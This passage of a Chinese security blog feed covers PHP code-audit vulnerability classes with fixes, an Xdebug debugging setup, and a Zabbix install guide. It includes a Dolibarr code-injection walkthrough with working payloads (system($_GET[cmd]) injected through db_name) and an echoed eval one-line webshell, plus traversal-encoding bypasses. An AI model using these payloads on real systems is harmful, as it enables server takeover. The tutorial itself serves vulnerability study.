件，Burp拦截数据包，修改扩展名</p><p><strong>文件上传绕过服务端</strong><br>黑白名单过滤<br>修改MIME类型<br>截断上传攻击<br>.htaccess文件攻击<br>目录验证</p><p><strong>防护方案</strong><br>检测文件上传内容<br>黑白名单验证，检测文件扩展名是否合法<br>MIME验证，检测文件的MIME类型<br>限制文件大小<br>更改临时文件夹的路径<br>读取上传文件的绝对路径与文件名称<br>隐藏文件路面</p><h4 id="文件操作漏洞"><a href="#文件操作漏洞" class="headerlink" title="文件操作漏洞"></a>文件操作漏洞</h4><p><img src="/images/代码审计/8.png" alt="upload successful"></p><h4 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h4><p>目录穿越(Directory Traversal)攻击是黑客能够在Web应用程序所在的根目录以外的文件夹上，任意地存取被限制的文件夹、执行命令或查找数据。目录穿越攻击，也有人称为Path Traversal攻击。</p><p><strong>漏洞危害</strong><br>攻击者可以使用目录穿越攻击来查找、执行或存取Web应用程序所在的根目录以外的文件夹。如果目录穿越攻击成功，黑客就可以执行破坏性的命令来攻击网站。</p><p><strong>绕过方式</strong><br>进行URL编码<br>点–&gt;%2e 反斜杠–&gt;%2f 正斜杠–&gt;%5c</p><p>进行16为Unicode编码<br>点–&gt;%u002e 反斜杠–&gt;%u2215 正斜杠–&gt;%u2216</p><p>进行双倍URL编码<br>点–&gt;%252e 反斜杠–&gt;%u252f 正斜杠–&gt;%u255c</p><p>进行超长UTF-8 Unicode编码点–&gt;%c0%2e %e0$40%ae %c0ae 反斜杠–&gt;%c0af %e0%80af %c0%af 正斜杠–&gt;%c0%5c %c0%80%5c</p><p><strong>修复方案</strong><br>在URL内不要使用文件名称作为参数<br>检查使用者输入的文件名是否有“..”的目录阶层字符<br>在php.ini文件中设置open_basedir来指定文件的目录<br>使用realpath函数来展开文件路径中的“./”、 “../”等字符，然后返回绝对路径名称<br>使用basename函数来返回不包含路径的文件名称</p><h4 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h4><p>文件包含漏洞的产生原因是在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞，被包涵的文件在第三方服务是，就形成了远程文件包含漏洞。</p><p><strong>漏洞危害</strong><br>执行恶意代码<br>包含恶意文件控制网站<br>甚至控制网站服务器等</p><p><strong>本地包含</strong><br>本地文件包含（Local File Include，LFI），LFI允许攻击者通过浏览器包含本机上的文件。当一个WEB应用程序在没有正确过滤输入数据的情况下，就有可能存在这个漏洞，该漏洞允许攻击者操纵输入数据、注入路径遍历字符、包含web服务器的其他文件。</p><p><strong>远程包含</strong><br>远程文件包含（Remote File Include，RFI）， RFI允许攻击者包含远程文件，远程文件包含需要设置allow_url_include = On，四个文件都支持HTTP、FTP等协议，相对本地文件包含更容易利用，出现的频率没有本地包含多。</p><p><strong>挖掘经验</strong><br>模块加载、cache调用，传入的参数拼接包含路径<br>include()<br>使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</p><p>inclue_once()<br>功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p><p> require()<br>使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</p><p> require_once()<br>功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p><p><strong>修复方案</strong><br>关闭远程包含参数开关，彻底切断这个业务相比较<br>设置类似白 名单的方法，筛选固定文件名<br>常见目录穿越字符进行过滤，如（./  .//  ..\等）</p><h4 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h4><p>通过提交专门设计的输入，攻击者就可以在被访问的文件系统中读取或写入任意内容，往往能够使攻击者从服务器上获取敏感信息文件，正常读取的文件没有经过校验或者不严格，用户可以控制这个变量读取任意文件</p><p><strong>漏洞危害</strong><br>任意文件读取漏洞，是web安全里高危的漏洞，它可以泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。</p><p><strong>挖掘经验</strong><br>fopen()<br>file_get_contents()<br>fread<br>fgets      allow_url_fopen选项激活了 URL 形式的 fopen 封装协议<br>fgetss   使得可以访问 URL 对象例如文件。默认的封装协议提供用<br>ftp 和 http 协议来访问远程文件，一些扩展库例如 zlib 可<br>file   能会注册更多的封装协议</p><h4 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h4><p>攻击者从寻找上删除的功能，正常删除功能的文件没有经过校验或者不严格，攻击者控制这个可操作的变量配合目录遍历进行删除其他文件</p><p><strong>unlink函数</strong>  </p><p><strong>修复方案</strong><br>正则严格判断用户参数的格式<br>检查使用者输入的文件名是否有 “..” 的目录阶层字符<br>在php.ini文件中设置open_basedir来限定文件访问范围</p><h3 id="0x06-常规漏洞的防范方法"><a href="#0x06-常规漏洞的防范方法" class="headerlink" title="0x06 常规漏洞的防范方法"></a>0x06 常规漏洞的防范方法</h3><h4 id="taint-PHP-安全扩展"><a href="#taint-PHP-安全扩展" class="headerlink" title="taint PHP 安全扩展"></a>taint PHP 安全扩展</h4><p><strong>功能介绍</strong><br>Taint 可以用来检测隐藏的 XSS code, SQL 注入， Shell注入等漏洞，并且这些漏洞如果要用静态分析工具去排查， 将会非常困难， 我们来看下面这张图:<br><img src="/images/代码审计/9.png" alt="upload successful"><br><strong>安装方法</strong><br>下载 taint：  <a href="http://pecl.php.net/package/taint" target="_blank" rel="noopener">http://pecl.php.net/package/taint</a></p><p><strong>配置</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/php/bin/phpize</span><br><span class="line">./configure --with-php-config=/usr/local/php/bin/php-config</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p><p>更加详细的可以参考：<a href="http://www.cnblogs.com/linzhenjie/p/5485474.html" target="_blank" rel="noopener">http://www.cnblogs.com/linzhenjie/p/5485474.html</a><br>应用场景<br>开发团队要求每个人都做到非常的安全比较难，但是把taint安装在开发环境，特别适合，一看到 warning 信息一般都回去改。</p><h4 id="ngx-lua-waf"><a href="#ngx-lua-waf" class="headerlink" title="ngx_lua_waf"></a>ngx_lua_waf</h4><p><strong>功能介绍</strong><br>防止 sql 注入，本地包含，部分溢出，fuzzing 测试，xss，SSRF 等 web攻击。<br>防止 svn /备份之类文件泄漏。<br>防止 ApacheBench 之类压力测试工具的攻击。<br>屏蔽常见的扫描黑客工具，扫描器。<br>屏蔽异常的网络请求。<br>屏蔽图片附件类目录 php 执行权限。<br>防止 webshell 上传。<br><strong>安装方法</strong><br>安装依赖: luajit 、ngx_devel_kit、nginx_lua_module<br>安装nginx、ngx_lua_waf<br>在nginx.conf里的 http 添加配置<br>详细安装文档<br><strong>效果图</strong><br><img src="/images/代码审计/10.png" alt="upload successful"></p><h3 id="0x07-参考文献"><a href="#0x07-参考文献" class="headerlink" title="0x07 参考文献"></a>0x07 参考文献</h3><p><a href="https://mp.weixin.qq.com/s/W4ZgCEmjkSAexXBTVBD_zg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/W4ZgCEmjkSAexXBTVBD_zg</a><br><a href="http://www.cnblogs.com/linzhenjie/p/5485474.html" target="_blank" rel="noopener">http://www.cnblogs.com/linzhenjie/p/5485474.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;工欲善其事，必先利其器。我们做代码审计之前选好工具也是十分必要的。下面我给大家介绍两款代码审计中比较好用的工具。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Phpstorm+phpstudy+xdebug+Dolibarr</title>
    <link href="http://yoursite.com/2018/08/11/Phpstorm-phpstudy-xdebug-Dolibarr/"/>
    <id>http://yoursite.com/2018/08/11/Phpstorm-phpstudy-xdebug-Dolibarr/</id>
    <published>2018-08-11T15:20:00.000Z</published>
    <updated>2018-08-11T15:46:28.358Z</updated>
    
    <content type="html"><![CDATA[<h3 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h3><blockquote><p>PhpStorm 是 JetBrains 公司开发的一款商业的 PHP 集成开发工具，旨在提高用户效率，可深刻理解用户的编码，提供智能代码补全，快速导航以及即时错误检查。phpStudy是一个PHP调试环境的程序集成包。该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer,一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境·该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等·总之学习PHP只需一个包。</p></blockquote><a id="more"></a><h3 id="【准备】"><a href="#【准备】" class="headerlink" title="【准备】"></a>【准备】</h3><p><strong>先从网上下载PhpStorm和Phpstudy软件，版本不限定。在第一次打开Phpstorm时，需要输入注册码，具体方法可参考<a href="https://blog.csdn.net/finish_dream/article/details/80045514" target="_blank" rel="noopener">https://blog.csdn.net/finish_dream/article/details/80045514</a> 亲测有效。</strong></p><h3 id="【配置步骤】"><a href="#【配置步骤】" class="headerlink" title="【配置步骤】"></a>【配置步骤】</h3><p><strong>进行phpStudy+PhpStorm+XDebug的配置，因为phpStudy集成了XDebug扩展，所以不用单独下载XDebug。</strong></p><p><strong>1.phpStudy当前版本确定，我们用PHP-5.5.38的版本。</strong></p><p><img src="/images/pasted-50.png" alt="upload successful"></p><p><strong>2.在其他选项菜单-&gt;打开配置文件-&gt;php.ini，滑到最后看到[XDebug]节点做如下的修改：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line"></span><br><span class="line">;性能分析文件的存放位置，默认值为/tmp</span><br><span class="line"></span><br><span class="line">xdebug.profiler_output_dir=&quot;G:\PHP\PhpStudy\tmp\xdebug&quot;</span><br><span class="line"></span><br><span class="line">;函数调用跟踪信息输出文件目录，默认值为/tmp</span><br><span class="line"></span><br><span class="line">xdebug.trace_output_dir=&quot;G:\PHP\PhpStudy\tmp\xdebug&quot;</span><br><span class="line"></span><br><span class="line">;zend_extension=&quot;G:\PHP\PhpStudy\php\php-5.5.38\ext\php_xdebug.dll&quot;</span><br><span class="line"></span><br><span class="line">zend_extension=&quot;G:\PHP\PhpStudy\php\php-5.5.38\ext\php_xdebug.dll&quot;</span><br><span class="line"></span><br><span class="line">;是否允许Xdebug跟踪函数调用，跟踪信息以文件形式存储，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.auto_trace=1</span><br><span class="line"></span><br><span class="line">;是否允许Xdebug跟踪函数参数，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.collect_params=1</span><br><span class="line"></span><br><span class="line">;是否允许Xdebug跟踪函数返回值，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.collect_return=1</span><br><span class="line"></span><br><span class="line">;打开xdebug的性能分析器，以文件形式存储，这项配置是不能以ini_set()函数配置的，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.profiler_enable = 1</span><br><span class="line"></span><br><span class="line">;性能分析文件的命名规则，默认值为cachegrind.out.%p</span><br><span class="line"></span><br><span class="line">xdebug.profiler_output_name = &quot;cachegrind.out.%t.%p&quot;</span><br><span class="line"></span><br><span class="line">xdebug.remote_enable = 1</span><br><span class="line"></span><br><span class="line">;用于zend studio远程调试的应用层通信协议</span><br><span class="line"></span><br><span class="line">xdebug.remote_handler = &quot;dbgp&quot;</span><br><span class="line"></span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line"></span><br><span class="line">xdebug.remote_host = &quot;127.0.0.1&quot;</span><br><span class="line"></span><br><span class="line">xdebug.remote_port = 9000</span><br></pre></td></tr></table></figure><p><strong>3.打开Phpstorm，需要打开或者新创一个项目，这里我们打开Phpstudy的根目录作为项目。在PhpStudy软件的解压目录下的www文件夹就是我们的网站根目录。</strong></p><p><img src="/images/pasted-51.png" alt="upload successful"></p><p>open -&gt;选择相应目录的WWW文件，点OK，再点OK 完成项目的创建。</p><p><img src="/images/pasted-52.png" alt="upload successful"></p><p><strong>4.选择PHP的版本信息。</strong></p><p><img src="/images/pasted-54.png" alt="upload successful"></p><p>Debug端口设置</p><p><img src="/images/pasted-55.png" alt="upload successful"></p><p>IDEKEY：</p><p><img src="/images/pasted-56.png" alt="upload successful"></p><p>配置PHP Web Application</p><p><img src="/images/pasted-57.png" alt="upload successful"></p><p>查看配置：</p><p><img src="/images/pasted-58.png" alt="upload successful"></p><p>xdebug配置完成了</p><p><strong>3.实现截取操作</strong></p><p>在火狐或是谷歌浏览器中下载插件Xdebug helper，图标为一只吃虫子的标志。点击Debug启动Xdebug helper。</p><p><img src="/images/pasted-59.png" alt="upload successful"></p><p>在Pphstorm中写好一个php文件，并开启如下的选项，左上角的电话图标。</p><p><img src="/images/pasted-60.png" alt="upload successful"></p><p>选择一个浏览器打开写好的文件</p><p><img src="/images/pasted-61.png" alt="upload successful"></p><p>截取到了内容，或者你点击网页的刷新，会在phpstrom中打开相应的php文件，也说明截取到了。</p><p><img src="/images/pasted-62.png" alt="upload successful"></p><h4 id="Dolibarr-ERP-CRM-php代码注入漏洞"><a href="#Dolibarr-ERP-CRM-php代码注入漏洞" class="headerlink" title="Dolibarr ERP/CRM php代码注入漏洞"></a>Dolibarr ERP/CRM php代码注入漏洞</h4><p><strong>Dolibarr ERP &amp; CRM是一个用于管理的组织的活动(联系人、供应商、发票、订单、股票、议程…)。它是一个用PHP语言编写的开源软件，支持mysql,mssql,pgsql。专为小型、中型或大型公司、基金会和自由职业者设计。</strong></p><p><strong>1、先配置好Dolibarr环境。</strong></p><p>将Dolibarr的压缩包解压到PhpStudy的WWW的目录下。</p><p><img src="/images/pasted-63.png" alt="upload successful"><br>然后打开Phpstuduy，点击其他选项菜单-&gt;Phpstudy设置-&gt;端口常规设置，在网站目录中选择dolibarr目录中的hedocs文件，然后点击应用。</p><p><img src="/images/pasted-64.png" alt="upload successful"></p><p>打开浏览器输入127.0.0.1/install</p><p><img src="/images/pasted-65.png" alt="upload successful"></p><p>然后点击开始进行dolibarr的安装。账户密码均为root，然后一直下一步，直至安装完毕。</p><p><img src="/images/pasted-66.png" alt="upload successful"></p><p>安装完毕后，会在Phpstrom中自动截取到step1.php的文件。</p><p><img src="/images/pasted-67.png" alt="upload successful"></p><p><strong>2、开始代码的修改。</strong></p><p>step1.php文件第55行接受了我们传递的db_name参数并执行了GETPOST方法</p><p><img src="/images/pasted-68.png" alt="upload successful"></p><p>按F7跟进GETPOST，在functions.lib.php第512行，GETPOST方法根据接收的check值进行不同的操作，此处接收的check值为alpha。我们看到在switch的alpha代码块中，对db_name的值进行了双引号和../的过滤。</p><p><img src="/images/pasted-69.png" alt="upload successful"></p><p>ALT+SHIFT=F7跳回step1.php,在接收了全部参数，并确定没有错误的情况下。在文件517行对配置文件进行了备份并调用write_conf_file方法将参数写入配置文件。</p><p><img src="/images/pasted-70.png" alt="upload successful"></p><p>继续跟进528行write_conf_file,函数首先定义了所需要的全局变量来获取参数值，并把配置写入/conf/conf.php文件。</p><p><img src="/images/pasted-71.png" alt="upload successful"></p><p>继续往下走，直接定位到写入数据库名称的代码段</p><p><img src="/images/pasted-72.png" alt="upload successful"></p><p>提交时前台会有js检测，用burp来截断修改我们的参数值，注意在提交时要勾选创建数据库复选框，否则配置文件写入不成功。</p><p>数据库名称改为dolibarr \’;phpinfo();//</p><p><img src="/images/pasted-73.png" alt="upload successful"></p><p>配置文件也进行了正常写入，但是虽然已经正常写入了代码，如果直接访问配置文件被阻止</p><p><img src="/images/pasted-74.png" alt="upload successful"></p><p>Ø通过包含此文件的文件去间接的执行代码</p><p><img src="/images/pasted-75.png" alt="upload successful"></p><p>更改payload，执行系统命令并getshell</p><p><img src="/images/pasted-76.png" alt="upload successful"></p><p>将db_name改为dolibarr \’;system($_GET[cmd]);//</p><p><img src="/images/pasted-77.png" alt="upload successful"></p><p>访问/insex.php?cmd={command}</p><p><img src="/images/pasted-79.png" alt="upload successful"></p><p>修改命令为echo “&lt;?php @eval($_POST[topsec])?&gt;”&gt; 网站绝对路径/shell.php</p><p><img src="/images/pasted-82.png" alt="upload successful"></p><p>请求后会在网站根目录下生成一句话木马，尝试用菜刀连接</p><p><img src="/images/pasted-80.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;【前言】&quot;&gt;&lt;a href=&quot;#【前言】&quot; class=&quot;headerlink&quot; title=&quot;【前言】&quot;&gt;&lt;/a&gt;【前言】&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;PhpStorm 是 JetBrains 公司开发的一款商业的 PHP 集成开发工具，旨在提高用户效率，可深刻理解用户的编码，提供智能代码补全，快速导航以及即时错误检查。phpStudy是一个PHP调试环境的程序集成包。该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer,一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境·该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等·总之学习PHP只需一个包。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Zabbix可视化监控的搭建</title>
    <link href="http://yoursite.com/2018/08/10/Zabbix%E5%8F%AF%E8%A7%86%E5%8C%96%E7%9B%91%E6%8E%A7%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>http://yoursite.com/2018/08/10/Zabbix可视化监控的搭建/</id>
    <published>2018-08-10T12:07:00.000Z</published>
    <updated>2018-08-13T13:51:49.833Z</updated>
    
    <content type="html"><![CDATA[<h3 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h3><blockquote><p>zabbix（音同 za:bix）是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。zabbix由2部分构成，zabbix server与可选组件zabbix agent。zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上。</p></blockquote><a id="more"></a><h3 id="0x01-【操作环境】"><a href="#0x01-【操作环境】" class="headerlink" title="0x01 【操作环境】"></a>0x01 【操作环境】</h3><p>CentOS Linux release 7.5.1804 (Core)<br>zabbix版本：zabbix-3.4.12</p><h3 id="0x02-【环境准备】"><a href="#0x02-【环境准备】" class="headerlink" title="0x02 【环境准备】"></a>0x02 【环境准备】</h3><p><strong>1、LAMP安装和启动：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Apache安装：yum install http* -y  </span><br><span class="line">Apache启动：systemctl start httpd  </span><br><span class="line">Mariadb安装：yum install mariadb-server mariadb -y  </span><br><span class="line">Mariadb启动：systemctl start mariadb.service  </span><br><span class="line">PHP安装：yum install php php-mysql php-common php-gd php-mbstring php-mcrypt php-devel php-xml php-bcmath -y</span><br></pre></td></tr></table></figure></p><p><strong>LAMP安装参考资料：<a href="https://www.cnblogs.com/me80/p/7218883.html" target="_blank" rel="noopener">https://www.cnblogs.com/me80/p/7218883.html</a> </strong></p><p><strong>2、GCC环境安装</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc gcc-c++ autoconf automake zlib zlib-devel openssl openssl-devel pcre pcre-devel -y</span><br></pre></td></tr></table></figure></p><p><strong>3、selinux和防火墙处理</strong><br>进入seliunx配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim  /etc/selinux/config SELINUX=disabled  #重启才生效</span><br><span class="line">selinux：setenforce 0  #临时关闭</span><br><span class="line">systemctl stop firewalld.service   #关闭防火墙</span><br></pre></td></tr></table></figure></p><h3 id="0x03-【安装步骤】"><a href="#0x03-【安装步骤】" class="headerlink" title="0x03 【安装步骤】"></a>0x03 【安装步骤】</h3><h4 id="一、安装zabbix"><a href="#一、安装zabbix" class="headerlink" title="一、安装zabbix"></a>一、安装zabbix</h4><p><strong>1、在官网下载zabbix安装包，<a href="https://www.zabbix.com/download" target="_blank" rel="noopener">https://www.zabbix.com/download</a></strong><br><strong>2、解压软件包并安装依赖包</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/src  </span><br><span class="line">tar -zxvf zabbix-3.4.12.tar.gz  </span><br><span class="line">yum -y install net-snmp-devel libxml2-devel libcurl-deve libevent libevent-devel libcurl</span><br></pre></td></tr></table></figure></p><p><strong>3、编译安装zabbix</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd zabbix-3.4.3/       #切换进入zabbix目录  </span><br><span class="line">./configure --prefix=/data/server/zabbix --enable-server --enable-agent --with-mysql --enable-ipv6 --with-net-snmp --with-libcurl --with-libxml2         #编译zabbix  </span><br><span class="line">make&amp;&amp;make install     #安装zabbix,此步骤有点长，请耐心等待。</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-36.png" alt="upload successful"></p><h4 id="二、配置zabbix"><a href="#二、配置zabbix" class="headerlink" title="二、配置zabbix"></a>二、配置zabbix</h4><p><strong>1、创建用户账户</strong><br>对于所有Zabbix的守护进程，需要一个无特权的用户。如果Zabbix守护进程以一个无特权的用户账户启动，那么它会使用该用户运行。<br>然而，如果一个守护进程以‘root’用户启动，它会切换为‘zabbix’用户账户，且这个用户必须存在。在Linux系统中，可以使用下面命令建立一个用户（该用户属于自己的用户组，“zabbix”）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">groupadd zabbix</span><br><span class="line">useradd -g zabbix zabbix</span><br></pre></td></tr></table></figure></p><p><strong>2、数据库导入zabbix template<br>使用数据库用户zabbix登录数据库</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql –uzabbix –p</span><br><span class="line">use zabbix;    #切换到zabbix库</span><br><span class="line">#导入zabbix默认表</span><br><span class="line">source /usr/local/src/zabbix-3.4.12/database/mysql/schema.sql;  </span><br><span class="line">source/usr/local/src/zabbix-3.4.12/database/mysql/images.sql;</span><br><span class="line">source /usr/local/src/zabbix-3.4.12/database/mysql/data.sql;</span><br></pre></td></tr></table></figure></p><p><strong>3、创建zabbix用户和日志目录并给予权限</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">useradd -s /sbin/nologin zabbix   #创建用户</span><br><span class="line">mkdir /usr/local/zabbix/logs    #创建目录</span><br><span class="line">chown -R zabbix:zabbix /usr/local/zabbix  #给予权限</span><br></pre></td></tr></table></figure></p><p><strong>4、配置zabbix的服务端（server）</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vim /data/server/zabbix/etc/zabbix_server.conf </span><br><span class="line">&gt;</span><br><span class="line">LogFile=/data/server/zabbix/logs/zabbix_server.log</span><br><span class="line">PidFile=/data/server/zabbix/zabbix_server.pid</span><br><span class="line">DBHost=localhost</span><br><span class="line">DBName=zabbix</span><br><span class="line">DBUser=zabbix</span><br><span class="line">DBPassword=123456</span><br><span class="line">DBSocket=/data/server/mysql/mysql.sock</span><br><span class="line">Timeout=4</span><br><span class="line">LogSlowQueries=3000</span><br><span class="line">Include=/data/server/zabbix/etc/zabbix_server.conf.d/*.conf</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-37.png" alt="upload successful"><br><strong>5、配置zabbix客户端（agent）</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim /data/server/zabbix/etc/zabbix_agentd.conf</span><br><span class="line">&gt;</span><br><span class="line">PidFile=/data/server/zabbix/zabbix_agentd.pid</span><br><span class="line">LogFile=/data/server/zabbix/logs/zabbix_agentd.log</span><br><span class="line">Server=127.0.0.1</span><br><span class="line">ListenPort=10050</span><br><span class="line">ServerActive=127.0.0.1</span><br><span class="line">Hostname=Zabbix server</span><br><span class="line">Include=/data/server/zabbix/etc/zabbix_agentd.conf.d/*.conf</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-38.png" alt="upload successful"><br><strong>6、配置PHP相应的文件</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/php.ini</span><br><span class="line">&gt;</span><br><span class="line">php_value max_execution_time 300</span><br><span class="line">php_value memory_limit 128M</span><br><span class="line">php_value post_max_size 16M</span><br><span class="line">php_value upload_max_filesize 2M</span><br><span class="line">php_value max_input_time 300</span><br><span class="line">php_value always_populate_raw_post_data -1</span><br><span class="line">date.timezone = Asia/Shanghai</span><br></pre></td></tr></table></figure></p><p><strong>7、安装zabbix web界面</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /var/www/html/zabbix</span><br><span class="line">cd /usr/local/src/zabbix-3.4.0/frontends/php </span><br><span class="line">cp -a . /var/www/html/zabbix</span><br></pre></td></tr></table></figure></p><p><strong>8、启动zabbix服务</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl start httpd    #启动apache服务</span><br><span class="line">/data/server/mysql/support-files/mysql.server start      #启动数据库服务</span><br><span class="line">/data/server/zabbix/sbin/zabbix_server       #启动zabbix服务端服务</span><br><span class="line">/data/server/zabbix/sbin/zabbix_agentd  #在所有的被监控机器上启动zabbix_agentd</span><br></pre></td></tr></table></figure></p><h4 id="三、配置zabbix前端"><a href="#三、配置zabbix前端" class="headerlink" title="三、配置zabbix前端"></a>三、配置zabbix前端</h4><p><strong>1、在你的浏览器中，打开Zabbix URL： http://&lt;服务器IP或主机名&gt;/zabbix<br><a href="http://192.168.199.206/zabbix/setup.php" target="_blank" rel="noopener">http://192.168.199.206/zabbix/setup.php</a><br>你可以看到前端安装向导的第一个页面。</strong></p><p><img src="/images/pasted-39.png" alt="upload successful"></p><p><strong>2、确认满足所有的软件安装前置条件,如果下图这些显示Failed，那么我们编辑/etc/php.ini，将下图中的配置项都改成要求的大小，未配置的项进行手动添加</strong><br>vim /etc/php.ini</p><p><img src="/images/pasted-40.png" alt="upload successful"></p><p>如果出现PHP xmlwiter，PHP smlreader off 那么请键入下条命令<br>yum install php-bcmath php-mbstring php-xmlwriter php-xmlreader<br>PHP LDAP Warning 